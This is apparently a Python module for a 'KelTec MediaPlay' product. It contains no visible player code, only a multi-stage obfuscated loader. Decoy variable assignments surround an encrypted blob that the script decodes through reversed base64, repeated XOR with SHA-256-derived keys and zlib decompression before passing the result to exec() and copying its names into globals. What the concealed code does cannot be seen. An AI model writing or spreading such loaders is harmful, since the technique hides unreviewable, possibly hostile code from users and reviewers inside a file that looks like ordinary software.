# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 108222 ^ 566746
_lx1_1 = len("4fe774")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-448229)
_lx3_3 = 922561 * 0
_lx4_4 = 329706 ^ 801541
_K = 'd3f65c90ffc043e627c18bc3c5335705ab2481cb2e14a030379af1828a95ff24'
_M = 'OJhsRPwuyhvZztYaha+zvxWXIdyeVtICI34cFXlkVmEtmGRf/nmVWIfO3xmI+unvFJgihp1ZhFcnfRsYJGVTP32eOQysfp8I1MPf'
_D = '=s9St5CmEa/Aoo29be7E4KdIA26VvZGDm3FluwMmaNzO9QM0gnGEad8LXTPOTNSqdi4chJ82OctRRcHZgymcCkBFgsHP1fyqTmt7rY/aauflAp1e6OFlb0bP+b784gevDfJ3ZVvMCWgyeRoOX+V8PS1jmx3s1NJQ0e2bAxYSW1EqIbsHEsgOl0IKge3KFr22WmubxHGW8ZN4RkZl1UrGWN6BEF/iVfzLWaYYAcIM2JcBo//EH3og7lj51c+nZ3VfjNxP6lcFXut3dzZZIl6rT/ktxtRzMw8o/QaTduoLz4XXXKOrRfcMYXYPZdBfAZ5HzkRyopnztywp+Vp1hpwiNb8TVQcHUAmYAucpkaDlWXKAAdmDleYhiO1A/d2Jqp9S4MNYgdBtH6m7jTUYOARYOgdRYpvnUoTM4mxOMTH7hlKe7TbhFBCGgonLBldS4asS5NvkaJYnn8w2Ix6/q7zgB1mw4/0FK9Hs2hpxFBVAqWQHBPDR0nQSTEAG0ZmOpJKOITKbw8aBp/o+fnfoAOTJH6gxAkg+XJ/ITXAFKZSqHhz9Dho04+WlO6kKGO7gpuh0K70hN4Tr4fGOsXhgXEUnfFYnfzxgS/sYGX5X7jvz7079vmmbuMycdbtfFYQ6Fi9WhQQ/FaF9Y/+Y2IR8CXbGktvSaoXYUgck7iAVIsxD0M40ziFbkHnwb1ECc6GjOfxDVZbQHxo86qdusWn+x5NAry/VltleNO2qX68/Gv/wROopnCD9fNtic0asIOB1Ap8UG24pDwa9d300un+xxaiiWgqJ9ZAFA7huScNiv/lQy0JtDq8ij87hGb+yRKVymMnl7jqLCkj0AFc9fGq66zpgrdW2c+fNdtkfGugsUScTD73uNv0Hb2IvOHJY02xnPvd0XdxnY6pjV+bj0BE+LGUli4gTKPxuJ+FcZA0iu2cVLm3t8gPqx6DFAFa5ZqqBznM6IG6QaOIg61aejjHw6DwisM3gffVk+wCyiGN1q7qOLJElcjsOcSW15BXkacfi8vltRd0/16KpdWfzjpNzAJb84sHGnsSegoSpFUBBHCQv3lCR9Im4jvOu48SV7OOgXobNRk/JacCTTjA04QxhPSmu/oLkG/lyd/d0vfXtJwaacZ8HVzp4j25GYtTB39rXYuVBPr0v0YO2iHt/APnJ2LfT/fGE9x1oIQyqMjHD7Fk4lpJYVV8/rIPb2KL9Is5M99RVobvc5KPY5ygB1vdPe45S7BXU+xfoHfKJEPcwbOwW9m/qX5r+69JKYTuHvok1tdanNJbUtji1m4bzSRAJYkKnj9IhCX8lghxyIqo473QwqiVd1UlHIge54eCTKkuTEbSUn10w3y79isa6ILDG6QOuaL9+w1bUVcFOdJSjwWnLrrDgEGku0kf7g5gr3Qoz5xS5WgeBxM+tE2VswaSY34A6hGp+RGAW96Rsu6fqmw/lZNHK0RG5UcB2U7gAf294InHzEIdd4/VQyFYwvRqbiKKJ9WP+kASsF2Swb200TafazRamRr9aKDdiy5RxWp9cjPrUJFPlMynxwTlqp5Wc6NGO1kueLjF/xkl3kT0M8jl7Mi4aabhcwJX+FH66npf1TosFaBGqYzgJhFP82yvQKi88kRAd7axVaO1OrANnH/sOm87uCup9RGYZ84aOTgyzJj6DlXrrbt9AO0737QFFtlP9M/HG/FQXeqoUrHZ3Jp0le9ODc/7GQiMBuZ8qPGEAIB/Ns9h9u47G5Fdb6FlNe55LYfO2NW5maFsBEzipAz+uw22oKLLr1KuC4ecqwn0qtDedJ2J9AeBNe3hJP+jy3/hqw3Cqz0E0vIoErzBseB0JPL3HRyrkCend0WvHnrEJob9T'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})